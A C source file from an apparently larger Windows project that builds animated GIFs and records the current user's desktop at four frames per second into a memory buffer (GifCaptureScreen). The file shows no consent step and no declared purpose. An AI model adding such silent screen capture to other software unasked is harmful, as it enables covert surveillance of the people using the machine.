//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// GIF project. Version 1.0
//	
// module: giflib.c
// $Revision: 454 $
// $Date: 2015-01-24 19:31:49 +0300 (Сб, 24 янв 2015) $
// description:
//	GIF management library.


#include "..\common\common.h"
#include "..\common\scrshot.h"
#include "giflib.h"
#include "..\config.h"

#if (defined(_ENABLE_VIDEO) && !defined(_AVI_VIDEO))

typedef BOOL					PL_BOOLEAN;


#define	GIF_FRAMES_PER_SECOND	4

static void *PlMalloc(size_t _Size)
{
	return(AppAlloc((ULONG)_Size));
}

static void *PlRealloc(void *_Mem, size_t _Size)
{
	if (_Mem)
		return(AppRealloc(_Mem, (ULONG)_Size));
	else
		return(AppAlloc((ULONG)_Size));
}

static void PlFree(void *_Memory)
{
	if (_Memory)
		AppFree(_Memory);
}


static WINERROR MemRangeCheck(void *pBase, unsigned long Size, void *pPtr, unsigned long PtrSize)
{
	if ((UCHAR *)pPtr < (UCHAR *)pBase)
		return PL_E_LIMIT;

	if ((UCHAR *)pPtr >= ((UCHAR *)pBase + Size))
		return PL_E_LIMIT;

	if (((UCHAR *)pPtr + PtrSize) < (UCHAR *)pBase)
		return PL_E_LIMIT;

	if (((UCHAR *)pPtr + PtrSize) >= ((UCHAR *)pBase + Size))
		return PL_E_LIMIT;

	return PL_E_OK;
}


static WINERROR	SafeMemCpy(void *pBase, unsigned long BaseLimit, void *pDst, void *pSrc, unsigned long SrcSize)
{
	WINERROR err;

	if (!pBase || !BaseLimit || !pSrc || !pDst || !SrcSize)
		return PL_E_INVALID_PARAM;

	if ((err = MemRangeCheck(pBase, BaseLimit, pSrc, SrcSize)))
		return err;

	memcpy(pDst, pSrc, SrcSize);
	return PL_E_OK;
}


static WINERROR	PtrAdvance(void *pBase, unsigned long Size, void **ppPtr, unsigned long Offset)
{
	void *pResult;

	if (!pBase || !Size || !ppPtr)
		return PL_E_INVALID_PARAM;
	
	pResult = (void *)((UCHAR *)(*ppPtr) + Offset);
	if ((UCHAR *)pResult < (UCHAR *)pBase)
		return PL_E_LIMIT;

	if ((UCHAR *)pResult >= ((UCHAR *)pBase + Size))
		return PL_E_LIMIT;

	*ppPtr = pResult;
	return PL_E_OK;
}


static WINERROR	GifImgJmp(void *pBase, unsigned long BaseLimit, void *pCurr, void **ppCurr)
{
	PGIF_IMG_HEADER ImgHeader = pCurr;
	UCHAR *pPos = pCurr;
	WINERROR err;

	err = PtrAdvance(pBase, BaseLimit, &pPos, sizeof(GIF_IMG_HEADER));
	if (err) {
		return err;
	}

	err = PtrAdvance(pBase, BaseLimit, &pPos, (ImgHeader->LocalColorTable) ? 3*(1 << (1 + ImgHeader->SizeOfLocalColorTable)) : 0);
	if (err)
		return err;

	//Lzw Minimum code size
	err = PtrAdvance(pBase, BaseLimit, &pPos, 1);
	if (err)
		return err;

	while (*pPos) {
		//pass blockSize field(1 byte) + blockSize bytes
		err = PtrAdvance(pBase, BaseLimit, &pPos, *pPos + 1);
		if (err)
			return err;
	}
	//pass terminator(1 byte)
	err = PtrAdvance(pBase, BaseLimit, &pPos, 1);
	if (err)
		return err;

	*ppCurr = pPos;
	return PL_E_OK;
}


static WINERROR	GifExtJmp(void *pBase, unsigned long BaseLimit, void *pCurr, void **ppCurr)
{
	UCHAR *pPos = pCurr;
	WINERROR err;

	err = PtrAdvance(pBase, BaseLimit, &pPos, sizeof(GIF_EXT)-1);
	if (err)
		return err;

	while (*pPos) {
		//pass blockSize field(1 byte) + blockSize bytes
		err = PtrAdvance(pBase, BaseLimit, &pPos, *pPos + 1);
		if (err)
			return err;
	}
	//pass terminator(1 byte)
	err = PtrAdvance(pBase, BaseLimit, &pPos, 1);
	if (err)
		return err;

	*ppCurr = pPos;
	return PL_E_OK;
}


static WINERROR	GifFirstElem(void *pBase, unsigned long BaseLimit, void **ppResult)
{
	GIF_HEADER Header;
	WINERROR err;
	UCHAR *pCurr = pBase;

	err = SafeMemCpy(pBase, BaseLimit, &Header, pBase, sizeof(Header));
	if (err)
		return err;

	err = PtrAdvance(pBase, BaseLimit, &pCurr, sizeof(Header));
	if (err) {
		PLPRINTF(("PtrAdvance err=%d\n", err));	
		return err;
	}

	err = PtrAdvance(pBase, BaseLimit, &pCurr, (Header.GlobalColorTable) ? 3*(1 << (1 + Header.SizeOfGlobalColorTable)) : 0);
	if (err)
		return err;

	*ppResult = pCurr;

	return PL_E_OK;
}


static WINERROR	GifNextElem(void *pBase, unsigned long BaseLimit, UCHAR *pCurr, UCHAR **ppResult, unsigned long *pResultSize, UCHAR **ppNext)
{
	WINERROR err = PL_E_UNDEFINED;
	UCHAR *pEnd;

	switch (*pCurr) {
		case GIF_IMG_BEGIN: {
			err = GifImgJmp(pBase, BaseLimit, pCurr, &pEnd);
			if (err)
				break;
			*ppResult = pCurr;
			*pResultSize = (unsigned long)(pEnd - pCurr);
			*ppNext = pEnd;
			err = PL_E_OK;
			break;
		}
		case GIF_EXT_BEGIN:
			err = GifExtJmp(pBase, BaseLimit, pCurr, &pEnd);
			if (err)
				break;
			*ppResult = pCurr;
			*pResultSize = (unsigned long)(pEnd - pCurr);
			*ppNext = pEnd;
			err = PL_E_OK;
			break;
		case GIF_END:
			err = PL_E_OK;
			*ppResult = PL_NULL;
			*pResultSize = 0;
			*ppNext = PL_NULL;
			err = PL_E_OK;
			break;
		default:
			err = PL_E_GIF_DECODE;
			break;
	}
	return err;
}


static WINERROR	GifImageCount(void *pBase, unsigned long BaseLimit, unsigned long *pImgCount)
{
	UCHAR *pElem;
	UCHAR *pResult;
	WINERROR err;
	unsigned long ImgCount = 0;
	unsigned long ResultSize;

	err = GifFirstElem(pBase, BaseLimit, &pElem);
	if (err)
		return err;

	while (1) {
		err = GifNextElem(pBase, BaseLimit, pElem, &pResult, &ResultSize, &pElem);
		if (err)
			return err;
		if (pResult == PL_NULL) //EOF
			break;
		if (*pResult == GIF_IMG_BEGIN) {
			ImgCount++;
		}
	}
	*pImgCount = ImgCount;

	return PL_E_OK;
}


static WINERROR	GifHasNetscapeExt(void *pBase, unsigned long BaseLimit, PL_BOOL *pbHasNetscapeExt)
{
	UCHAR *pElem;
	UCHAR *pResult;
	unsigned long ResultSize;
	WINERROR err;
	int i = 0;

	*pbHasNetscapeExt = PL_FALSE;

	err = GifFirstElem(pBase, BaseLimit, &pElem);
	if (err)
		return err;

	while (1) {
		err = GifNextElem(pBase, BaseLimit, pElem, &pResult, &ResultSize, &pElem);
		if (err)
			return err;
		if (pResult == PL_NULL) //EOF
			return PL_E_OK;
		if (*pResult == GIF_EXT_BEGIN) {
			PGIF_EXT pExt = (PGIF_EXT)pResult;
			if (pExt->label == GIF_APP_LABEL) {
				PGIF_APP_EXT AppExt = (PGIF_APP_EXT)pResult;
				if (!StrCmpNA(AppExt->appId, NETSCAPE_ID, cstrlenA(NETSCAPE_ID))) {
					*pbHasNetscapeExt = PL_TRUE;
					return PL_E_OK;
				}
			}
		}
	}

	return PL_E_OK;
}


static WINERROR	GifImageAt(
	int				pos, 
	void			*pBase, 
	unsigned long	BaseLimit, 
	void			**ppResult, 
	unsigned long	*pResultSize, 
	void			**ppGce, 
	unsigned long	*pGceSize
	)
{
	UCHAR *pElem;
	UCHAR *pResult;
	UCHAR *pGce;
	unsigned long ResultSize, GceSize;
	WINERROR err;
	int i = 0;

	*ppResult = PL_NULL;
	*pResultSize = 0;
	*ppGce = PL_NULL;
	*pGceSize = 0;

	err = GifFirstElem(pBase, BaseLimit, &pElem);
	if (err)
		return err;

	while (1) {
		err = GifNextElem(pBase, BaseLimit, pElem, &pResult, &ResultSize, &pElem);
		if (err)
			return err;
		if (pResult == PL_NULL) //EOF
			return PL_E_EOF;
		if (*pResult == GIF_IMG_BEGIN) {
			if (i == pos) {
				*ppResult = pResult;
				*pResultSize = ResultSize;
				if (pGce && ((pGce + GceSize) == pResult)) {//its gce for our image
					*ppGce = pGce;
					*pGceSize = GceSize;
				}
				return PL_E_OK;
			} 
			i++;
			if (i > pos)
				break;
		} else if (*pResult == GIF_EXT_BEGIN) {
			PGIF_EXT pExt = (PGIF_EXT)pResult;
			if (pExt->label == GIF_GCE_LABEL) {
				pGce = (UCHAR *)pExt;
				GceSize = sizeof(GIF_GCE_EXT);
			}
		}
	}

	return PL_E_NOT_FOUND;
}


static WINERROR GifAddFrame(
	void			*pSrc, 
	unsigned long	SrcSize, 
	void			*pFrame, 
	unsigned long	FrameSize, 
	unsigned short	Delay,
	void			**ppResult,
	unsigned long	*pResultSize
	)
{
	GIF_HEADER SrcHeader, FrameHeader;
	WINERROR err;
	void *pSrcGce, *pFrameGce;
	void *pSrcImg, *pFrameImg;
	unsigned long SrcGceSize, FrameGceSize, SrcImgSize, FrameImgSize;
	unsigned long SrcImgCount, FrameImgCount;
	PL_BOOL bFrameNetscape = PL_FALSE, bSrcNetscape = PL_FALSE;
	UCHAR *pResult, *pCurr;
	unsigned long ResultSize;

	PLPRINTF(("pSrc=%p, SrcSize=%d, pFrame=%p, FrameSize=%d, Delay=%d, ppResult=%p, pResultSize=%p\n",
		pSrc, SrcSize, pFrame, FrameSize, Delay, ppResult, pResultSize));

	if (SrcSize <= sizeof(SrcHeader) || FrameSize <= sizeof(FrameHeader)) 
		return PL_E_GIF_DECODE;

	memcpy(&SrcHeader, pSrc, sizeof(SrcHeader));
	memcpy(&FrameHeader, pFrame, sizeof(SrcHeader));

	if (StrCmpNA(SrcHeader.sign, szGifSign, cstrlenA(szGifSign)))
		return PL_E_GIF_DECODE;

	if (StrCmpNA(FrameHeader.sign, szGifSign, cstrlenA(szGifSign)))
		return PL_E_GIF_DECODE;

	if (StrCmpNA(SrcHeader.ver, szGif89a, cstrlenA(szGif89a)))
		return PL_E_GIF_DECODE;

	if (StrCmpNA(FrameHeader.ver, szGif89a, cstrlenA(szGif89a)))
		return PL_E_GIF_DECODE;

	err = GifImageCount(pSrc, SrcSize, &SrcImgCount);
	if (err)
		return err;

	err = GifImageCount(pFrame, FrameSize, &FrameImgCount);
	if (err)
		return err;

	err = GifHasNetscapeExt(pSrc, SrcSize, &bSrcNetscape);
	if (err)
		return err;

	err = GifHasNetscapeExt(pFrame, FrameSize, &bFrameNetscape);
	if (err)
		return err;

	PLPRINTF(("bSrcNetscape=%x, bFrameNetscape=%x\n", bSrcNetscape, bFrameNetscape));
	PLPRINTF(("SrcImgCount=%d, FrameImgCount=%d\n", SrcImgCount, FrameImgCount));
	PLPRINTF(("Src height=%d, width=%d, packedFields=%x, backgroundColorIndex=%d\n", 
		SrcHeader.screenHeight, SrcHeader.screenWidth, SrcHeader.packedFields, SrcHeader.backgroundColorIndex));
	PLPRINTF(("Frame height=%d, width=%d, packedFields=%x, backgroundColorIndex=%d\n", 
		FrameHeader.screenHeight, FrameHeader.screenWidth, FrameHeader.packedFields, FrameHeader.backgroundColorIndex));

	if (SrcImgCount < 1 || FrameImgCount < 1)
		return PL_E_INVALID_PARAM;

	pCurr = pSrc;
	if ((err = PtrAdvance(pSrc, SrcSize, &pCurr, SrcSize - 1)))
		return err;
	
	if (*pCurr != GIF_END)
		return PL_E_GIF_DECODE;
	
	err = GifImageAt(0, pSrc, SrcSize, &pSrcImg, &SrcImgSize, &pSrcGce, &SrcGceSize);
	if (err) 
		return err;

	PLPRINTF(("pSrcImg=%p, pSrcGce=%p\n", pSrcImg, pSrcGce));
	err = GifImageAt(0, pFrame, FrameSize, &pFrameImg, &FrameImgSize, &pFrameGce, &FrameGceSize);
	if (err) 
		return err;		
	PLPRINTF(("pFrameImg=%p, pFrameGce=%p\n", pFrameImg, pFrameGce));

	ResultSize = SrcSize + FrameImgSize + sizeof(GIF_GCE_EXT);
	ResultSize+= (bSrcNetscape) ? 0 : sizeof(cNetscapeExt);
	pResult = PlMalloc(ResultSize);
	if (!pResult)
		return PL_E_MALLOC;
	
	pCurr = pResult;
	if (bSrcNetscape) {
		memcpy(pCurr, pSrc, SrcSize-1);
		err = PtrAdvance(pResult, ResultSize, &pCurr, SrcSize - 1);
		if (err) {
			PlFree(pResult);
			return err;
		}
	} else {
		UCHAR *pElem;
		unsigned long headerSize;
		err = GifFirstElem(pSrc, SrcSize, &pElem);
		if (err)
			return err;
		headerSize = (unsigned long)(pElem - (UCHAR *)pSrc);
		PLPRINTF(("headerSize=%d\n", headerSize));
		//Copy header
		memcpy(pCurr, pSrc, headerSize);
		err = PtrAdvance(pResult, ResultSize, &pCurr, headerSize);
		if (err) {
			PlFree(pResult);
			return err;
		}
		memcpy(pCurr, cNetscapeExt, sizeof(cNetscapeExt));
		err = PtrAdvance(pResult, ResultSize, &pCurr, sizeof(cNetscapeExt));
		if (err) {
			PlFree(pResult);
			return err;
		}
		//Copy rest body
		memcpy(pCurr, (UCHAR *)pSrc + headerSize, SrcSize-1-headerSize);
		err = PtrAdvance(pResult, ResultSize, &pCurr, SrcSize-1-headerSize);
		if (err) {
			PlFree(pResult);
			return err;
		}
	}

	if (pFrameGce) {
		memcpy(pCurr, pFrameGce, FrameGceSize);
	} else {
		PLPRINTF(("No FRAME gce!!\n"));
		memset(pCurr, 0, sizeof(GIF_GCE_EXT));
		((PGIF_GCE_EXT)pCurr)->header.intro = GIF_EXT_BEGIN;
		((PGIF_GCE_EXT)pCurr)->header.label = GIF_GCE_LABEL;
		((PGIF_GCE_EXT)pCurr)->header.blockSize = 4;
	}

	//Copy delay from source
	if (SrcImgCount > 1) {
		((PGIF_GCE_EXT)pCurr)->Delay = ((PGIF_GCE_EXT)pSrcGce)->Delay;
	} else {
		PGIF_GCE_EXT pResultGce = (bSrcNetscape) ? (PGIF_GCE_EXT)(pResult + ((UCHAR *)pSrcGce - (UCHAR *)pSrc))
			: (PGIF_GCE_EXT)(pResult + ((UCHAR *)pSrcGce - (UCHAR *)pSrc) + sizeof(cNetscapeExt));

		ASSERT(pResultGce->header.intro == GIF_EXT_BEGIN);
		ASSERT(pResultGce->header.label == GIF_GCE_LABEL);

		pResultGce->Delay = Delay;
		((PGIF_GCE_EXT)pCurr)->Delay = Delay;
	}

	err = PtrAdvance(pResult, ResultSize, &pCurr, sizeof(GIF_GCE_EXT));
	if (err) {
		PlFree(pResult);
		return err;
	}
	//Copy image
	memcpy(pCurr, pFrameImg, FrameImgSize);
	err = PtrAdvance(pResult, ResultSize, &pCurr, FrameImgSize);
	if (err) {
		PlFree(pResult);
		return err;			
	}
	*pCurr = GIF_END;
	*ppResult = pResult;
	*pResultSize = ResultSize;
	err = PL_E_OK;

	return err;
}


static WINERROR GifAddStream(
	LPSTREAM	pTarget,
	LPSTREAM	pFrame,
	USHORT		Delay
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG	FrameLen, SourceLen, TargetLen;
	PCHAR	FrameBuf = NULL, SourceBuf = NULL, TargetBuf = NULL;

	StreamGotoBegin(pTarget);
	StreamGotoBegin(pFrame);

	SourceLen = StreamGetLength(pTarget);
	FrameLen = StreamGetLength(pFrame);

	do
	{
		if (!(SourceBuf = AppAlloc(SourceLen)))
			break;

		if (!(FrameBuf = AppAlloc(FrameLen)))
			break;

		StreamRead(pTarget, SourceBuf, SourceLen, NULL);
		StreamRead(pFrame, FrameBuf, FrameLen, NULL);

		Status = GifAddFrame(SourceBuf, SourceLen, FrameBuf, FrameLen, Delay, &TargetBuf, &TargetLen);

		if (Status != NO_ERROR)
			break;
		
		StreamClear(pTarget);
		StreamWrite(pTarget, TargetBuf, TargetLen, NULL);
	} while(FALSE);

	if (SourceBuf)
		AppFree(SourceBuf);
	if (FrameBuf)
		AppFree(FrameBuf);
	if (TargetBuf)
		AppFree(TargetBuf);

	return(Status);
}


//
//	Captures a video of the specified length from the current user desktop and stores it in animated GIF format.
//
WINERROR GifCaptureScreen(
	ULONG	Seconds,			// number of seconds of video to capture
	ULONG	FramesPerSecond,	// umber of frames per second, should be a power of 2
	PCHAR*	ppBuffer,			// receives a buffer containing screen capture in GIF
	PULONG	pSize				// receives size of the buffer
	)
{
	WINERROR Status	= ERROR_UNSUCCESSFULL;
	CLSID	imageCLSID = {0};
	LPSTREAM pGifStream = NULL, pFrameStream = NULL;
	ULONG	Size, Frames = Seconds * GIF_FRAMES_PER_SECOND;
	BOOL	bFrame = FALSE;
	PCHAR	pBuffer;
	LARGE_INTEGER	Period;
	HANDLE	hTimer = NULL;
	HANDLE	Objects[2];

	do
	{
		if (CreateStreamOnHGlobal(NULL, TRUE, &pGifStream) != S_OK)
			break;

		if (CreateStreamOnHGlobal(NULL, TRUE, &pFrameStream) != S_OK)
			break;

		if ((Status = ScrGetEncoderClsid(wczImageGif, &imageCLSID)) != NO_ERROR)
			break;

		if (!(hTimer = CreateWaitableTimer(NULL, TRUE, NULL)))
			break;

		Period.QuadPart = _RELATIVE(_MILLISECONDS(1));
		SetWaitableTimer(hTimer, &Period, 0, NULL, NULL, FALSE);
		Period.QuadPart = _RELATIVE(_MILLISECONDS(1000 / GIF_FRAMES_PER_SECOND));

		Objects[0] = g_AppShutdownEvent;
		Objects[1] = hTimer;
	
		while(Frames && Status == NO_ERROR)
		{
			Status = WaitForMultipleObjects(2, Objects, FALSE, INFINITE);
			if (Status != (WAIT_OBJECT_0 + 1))
				break;
		
			SetWaitableTimer(hTimer, &Period, 0, NULL, NULL, FALSE);

			if ((Status = ScrMakeScreenshot(GetShellWindow(), NULL, pFrameStream, &imageCLSID)) == NO_ERROR)
			{
				if (!bFrame)
				{	
					ULARGE_INTEGER	lSize;

					lSize.QuadPart = (ULONGLONG)StreamGetLength(pFrameStream);
					StreamGotoBegin(pFrameStream);

					CoInvoke(pFrameStream, CopyTo, pGifStream, lSize, NULL, NULL);
					bFrame = TRUE;
				}				
				else
					Status = GifAddStream(pGifStream, pFrameStream, 1000 / GIF_FRAMES_PER_SECOND);

				StreamClear(pFrameStream);
			}	// if ((Status = GenerateImage(GetShellWindow(), &hBitmap, &hSource)) == NO_ERROR)
			else
				break;

			Frames -= 1;
		}	// while(Frames)

		if (Status != NO_ERROR)
			break;

		if (!(Size = StreamGetLength(pGifStream)))
		{
			Status = ERROR_NO_DATA;
			break;
		}

		Status = ERROR_UNSUCCESSFULL;
		
		if (!(pBuffer = AppAlloc(Size)))
			break;

		StreamGotoBegin(pGifStream);
		if (StreamRead(pGifStream, pBuffer, Size, pSize) != S_OK)
			break;
		
		*ppBuffer = pBuffer;
		Status = NO_ERROR;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (hTimer)
		CloseHandle(hTimer);

	if (pGifStream)
		StreamRelease(pGifStream);

	if (pFrameStream)
		StreamRelease(pFrameStream);

	return(Status);
}


#endif	// _ENABLE_VIDEO